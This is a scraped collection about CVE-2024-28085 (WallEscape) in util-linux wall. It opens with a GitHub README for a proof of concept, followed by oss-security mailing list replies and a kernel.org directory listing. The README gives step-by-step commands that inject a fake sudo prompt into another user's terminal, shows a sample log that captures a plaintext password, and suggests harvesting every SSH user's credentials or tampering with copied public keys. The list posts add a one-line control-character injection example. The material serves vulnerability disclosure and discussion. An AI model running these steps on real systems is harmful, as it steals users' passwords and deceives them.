
Attack setup

```
git clone https://github.com/skyler-ferrante/CVE-2024-28085.git
./build.sh
./spy > proc.log & ./watch "sudo systemctl start apache2"; ./watch "systemctl start apache2"; sleep .01; ./throw

```

I used `sudo systemctl start apache2` since it is short running without much output.
Make sure to kill spy after the exploit has run: `pkill spy`.

Then in another terminal

```
sudo su
sudo systemctl start apache2

```

It might not be necessary for the victim to call `su` depending on the system, and if accessing locally vs through ssh.

This should cause the fake sudo prompt to pop up in the victim terminal. Since
many systems leak commands that are not found, the victim password may show up in proc.log.

Example proc.log

```
sudo systemctl start apache2
systemctl start apache2
./throw
bash
/usr/bin/python3 /usr/lib/command-not-found -- Password123!
/usr/bin/snap advise-snap --format=json --command Password123!

```

# Note

Some people have misunderstood under what scenarios this could be used to attack another user. We do not need to attack sudo, we can attack anywhere the user inputs their password. On my system, after a user logs in using OpenSSH, the command `/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new` gets run.

For leaking passwords from Openssh users, imagine running the following:

```
./watch "sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new"; sleep 1; ./throw

```

We can then send a "password incorrect" message after a user can correctly login through SSH. Sudo was just the command I choose to demo, but there are many possible targets. Its not hard to imagine an attacker setting up a credential harvester, to harvest the credentials of every user that logins using SSH. This is possible from even the most unprivileged users, such as www-data.

This vulnerability also gives attackers the ability to change the output of any command. Imagine we waited for the command `cat ~/.ssh/id_rsa.pub"`. An attacker could change what the user copies for their public key. In the style of attack, we do not need a leaking primitive for commands not found.

## About

WallEscape vulnerability in util-linux

[people.rit.edu/sjf5462/6831711781/wall\_2\_27\_2024.txt](https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt")

### Topics

[exploit](/topics/exploit "Topic: exploit")
[vulnerability](/topics/vulnerability "Topic: vulnerability")
[cve](/topics/cve "Topic: cve")
[privilege-escalation](/topics/privilege-escalation "Topic: privilege-escalation")
[redteam](/topics/redteam "Topic: redteam")
[privesc](/topics/privesc "Topic: privesc")

### Resources

[Readme](#readme-ov-file)

[Activity](/skyler-ferrante/CVE-2024-28085/activity)
### Stars

[**49**
stars](/skyler-ferrante/CVE-2024-28085/stargazers)
### Watchers

[**1**
watching](/skyler-ferrante/CVE-2024-28085/watchers)
### Forks

[**7**
forks](/skyler-ferrante/CVE-2024-28085/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fskyler-ferrante%2FCVE-2024-28085&report=skyler-ferrante+%28user%29)

## [Releases](/skyler-ferrante/CVE-2024-28085/releases)

No releases published

## [Packages 0](/users/skyler-ferrante/packages?repo_name=CVE-2024-28085)

No packages published

## Languages

* [C
  97.5%](/skyler-ferrante/CVE-2024-28085/search?l=c)
* [Shell
  2.5%](/skyler-ferrante/CVE-2024-28085/search?l=shell)

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from www.openwall.com_3e5e0371_20250110_193424.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux Â  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper Â  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists Â  *for password cracking*](/wordlists/)+ [passwdqc Â  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt Â  *KDF & password hashing*](/yescrypt/)+ [yespower Â  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish Â  *password hashing*](/crypt/)+ [phpass Â  *ditto in PHP*](/phpass/)+ [tcb Â  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd Â  *port scan detector*](/scanlogd/)+ [popa3d Â  *tiny POP3 daemon*](/popa3d/)+ [blists Â  *web interface to mailing lists*](/blists/)+ [msulogin Â  *single user mode login*](/msulogin/)+ [php\_mt\_seed Â  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](8) [[next>]](../../../2024/03/28/1) [[<thread-prev]](8) [[thread-next>]](../../../2024/03/28/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240327232935.GA17111@openwall.com>
Date: Thu, 28 Mar 2024 00:29:35 +0100
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Cc: Karel Zak <kzak@...hat.com>,
	"Skyler Ferrante (RIT Student)" <sjf5462@....edu>
Subject: Re: CVE-2024-28085: Escape sequence injection in util-linux wall

Hi,

CC's added for upstream and reporter of the original issue, neither of
whom appears subscribed.

On Wed, Mar 27, 2024 at 07:00:02PM -0400, Demi Marie Obenour wrote:
> On Wed, Mar 27, 2024 at 10:30:41PM +0100, Jakub Wilk wrote:
> > While looking through upstream git for a fix for this??, I stumbled upon
> > another write(1)/wall(1) control character injection vulnerability,
> > introduced last year in util-linux v2.39.
> >
> > The offending commits are:
> >
> > * <https://github.com/util-linux/util-linux/commit/8a7b8456d1dc0e7c>
> >   ("write: correctly handle wide characters")
> > * <https://github.com/util-linux/util-linux/commit/aa13246a1bf1be9e>
> >   ("wall: use fputs_careful()")
> >
> > The added comment says:
> >
> > > The locale of the recipient is nominally unknown,
> > > but it's a solid bet that the encoding is compatible with the author's.
> >
> > Alas the bet is not that solid when writer's locale encoding is controlled
> > by an attacker.
> >
> > We can exploit this against terminal emulators that recognize C1 control
> > characters, such as Linux VTs or screen(1):
> >
> >    $ printf '\302\23331mMOO\302\2330m\n' | LC_ALL=kk_KZ wall
> >
> > I don't see any good way to fix this on the util-linux's side. It should be
> > fixed on the terminal emulators' side by disabling C1 support.
> >
> >
> > ?? <https://github.com/util-linux/util-linux/commit/404b0781f52f7c04>
> >   ("wall: fix escape sequence Injection [CVE-2024-28085]")
>
> Would enforcing UTF-8 validity (regardless of user locale) be a
> solution?

Not a complete solution.  I'm currently not aware of a safe way to allow
multi-byte characters coming from concurrent writers, see:

<https://www.openwall.com/lists/oss-security/2015/09/20/1>

and the next message in that thread.

In fact, even plain ASCII isn't entirely safe if it just happens to be
injected into the middle of a control sequence that the target user's
program was printing, thereby altering its effect.

That said, perhaps write(1)/wall(1) just shouldn't allow bytes from both
C0 and C1 ranges (except for TAB, LF, space) regardless of locale
settings, at least when the programs are running SUID/SGID.  That is,
unless the invoking user - which in this case is likely root - could
have directly written to the target user's tty anyway.  In other words,
mostly revert those offending commits.  Or just revert them completely.

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_f14b4df2_20250110_193425.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux Â  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper Â  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists Â  *for password cracking*](/wordlists/)+ [passwdqc Â  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt Â  *KDF & password hashing*](/yescrypt/)+ [yespower Â  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish Â  *password hashing*](/crypt/)+ [phpass Â  *ditto in PHP*](/phpass/)+ [tcb Â  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd Â  *port scan detector*](/scanlogd/)+ [popa3d Â  *tiny POP3 daemon*](/popa3d/)+ [blists Â  *web interface to mailing lists*](/blists/)+ [msulogin Â  *single user mode login*](/msulogin/)+ [php\_mt\_seed Â  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[<thread-prev]](1) [[thread-next>]](3) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240328083841.bua26s3neakdegmg@jwilk.net>
Date: Thu, 28 Mar 2024 09:38:41 +0100
From: Jakub Wilk <jwilk@...lk.net>
To: <oss-security@...ts.openwall.com>
Subject: Re: Re: CVE-2024-28085: Escape sequence injection in
 util-linux wall

* nightmare.yeah27@...ecat.org, 2024-03-27 13:57:
>/etc/default/devpts

This file is used by sysvinit when mounting /dev/pts.

systemd doesn't use it. It mounts /dev/pts with mode=620 by default.

>/etc/login.defs

As far as I can see, TTYPERM from login.defs is used only by login(1)
and sometimesÂ¹ by su(1). If you log in through SSH, or run xterm(1) or
screen(1) or... it won't have any effect.

It's all awful and undocumented.

Â¹ <https://github.com/util-linux/util-linux/commit/17d5b264367debb7>
   ("su: (pty) change owner and mode for pty")

--
Jakub Wilk

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from mirrors.edge.kernel.org_60c370fd_20250110_193426.html ===

# Index of /pub/linux/utils/util-linux/

---

```
<../>
<v2.13/>                                             19-Jan-2012 11:54       -
<v2.14/>                                             19-Jan-2012 11:42       -
<v2.15/>                                             19-Jan-2012 11:31       -
<v2.16/>                                             19-Jan-2012 11:18       -
<v2.17/>                                             19-Jan-2012 11:21       -
<v2.18/>                                             19-Jan-2012 10:59       -
<v2.19/>                                             19-Jan-2012 10:53       -
<v2.20/>                                             19-Jan-2012 12:02       -
<v2.21/>                                             25-May-2012 11:10       -
<v2.22/>                                             13-Dec-2012 12:02       -
<v2.23/>                                             31-Jul-2013 12:40       -
<v2.24/>                                             24-Apr-2014 10:18       -
<v2.25/>                                             24-Oct-2014 13:08       -
<v2.26/>                                             30-Apr-2015 10:44       -
<v2.27/>                                             02-Nov-2015 11:06       -
<v2.28/>                                             07-Sep-2016 12:06       -
<v2.29/>                                             22-Feb-2017 15:26       -
<v2.30/>                                             21-Sep-2017 09:51       -
<v2.31/>                                             19-Dec-2017 15:18       -
<v2.32/>                                             16-Jul-2018 11:29       -
<v2.33/>                                             09-Apr-2019 13:57       -
<v2.34/>                                             14-Jun-2019 10:46       -
<v2.35/>                                             20-May-2020 14:00       -
<v2.36/>                                             12-Feb-2021 14:21       -
<v2.37/>                                             14-Feb-2022 11:01       -
<v2.38/>                                             04-Aug-2022 09:20       -
<v2.39/>                                             04-Apr-2024 09:31       -
<v2.40/>                                             09-Jan-2025 12:27       -

```

---



=== Content from www.openwall.com_ac0d4a4f_20250110_193424.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux Â  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper Â  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists Â  *for password cracking*](/wordlists/)+ [passwdqc Â  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt Â  *KDF & password hashing*](/yescrypt/)+ [yespower Â  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish Â  *password hashing*](/crypt/)+ [phpass Â  *ditto in PHP*](/phpass/)+ [tcb Â  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd Â  *port scan detector*](/scanlogd/)+ [popa3d Â  *tiny POP3 daemon*](/popa3d/)+ [blists Â  *web interface to mailing lists*](/blists/)+ [msulogin Â  *single user mode login*](/msulogin/)+ [php\_mt\_seed Â  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](6) [[next>]](8) [[<thread-prev]](6) [[thread-next>]](8) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240327213041.qyr7sglmxgdmtcb4@jwilk.net>
Date: Wed, 27 Mar 2024 22:30:41 +0100
From: Jakub Wilk <jwilk@...lk.net>
To: <oss-security@...ts.openwall.com>
Subject: Re: CVE-2024-28085: Escape sequence injection in
 util-linux wall

While looking through upstream git for a fix for thisÂ¹, I stumbled upon
another write(1)/wall(1) control character injection vulnerability,
introduced last year in util-linux v2.39.

The offending commits are:

* <https://github.com/util-linux/util-linux/commit/8a7b8456d1dc0e7c>
   ("write: correctly handle wide characters")
* <https://github.com/util-linux/util-linux/commit/aa13246a1bf1be9e>
   ("wall: use fputs_careful()")

The added comment says:

>The locale of the recipient is nominally unknown,
>but it's a solid bet that the encoding is compatible with the author's.

Alas the bet is not that solid when writer's locale encoding is
controlled by an attacker.

We can exploit this against terminal emulators that recognize C1 control
characters, such as Linux VTs or screen(1):

    $ printf '\302\23331mMOO\302\2330m\n' | LC_ALL=kk_KZ wall

I don't see any good way to fix this on the util-linux's side. It should
be fixed on the terminal emulators' side by disabling C1 support.

Â¹ <https://github.com/util-linux/util-linux/commit/404b0781f52f7c04>
   ("wall: fix escape sequence Injection [CVE-2024-28085]")

--
Jakub Wilk

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


